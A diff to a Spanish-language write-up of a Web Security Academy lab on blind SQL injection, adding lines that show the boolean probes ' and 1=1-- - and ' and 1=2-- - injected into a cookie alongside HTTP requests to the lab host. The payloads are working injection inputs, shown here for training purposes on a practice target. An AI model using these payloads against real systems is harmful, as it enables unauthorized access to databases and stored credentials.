@@ -92,7 +92,7 @@ The results of the SQL query are not returned, and no error messages are display
 
 The database contains a different table called ```users```, with columns called ```username``` and ```password```. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user. "
 
-En la siguiente peticion recibimos el mensaje "Welcome back"
+En la siguiente peticion inyectando la sentencia ```' and 1=1-- -``` en la cookie recibimos el mensaje "Welcome back"
 ```http
 GET / HTTP/2
 Host: 0a6f0036037b631e8c38b2a0004e009e.web-security-academy.net
@@ -109,7 +109,7 @@ Sec-Fetch-Site: cross-site
 Sec-Fetch-User: ?1
 Te: trailers
 ```
-Y en esta no recibimos el mensaje "Welcome back"
+Y en esta inyectando la sentencia ```' and 1=2-- -``` en la cookie no recibimos el mensaje "Welcome back"
 ```http
 GET / HTTP/2
 Host: 0a6f0036037b631e8c38b2a0004e009e.web-security-academy.net
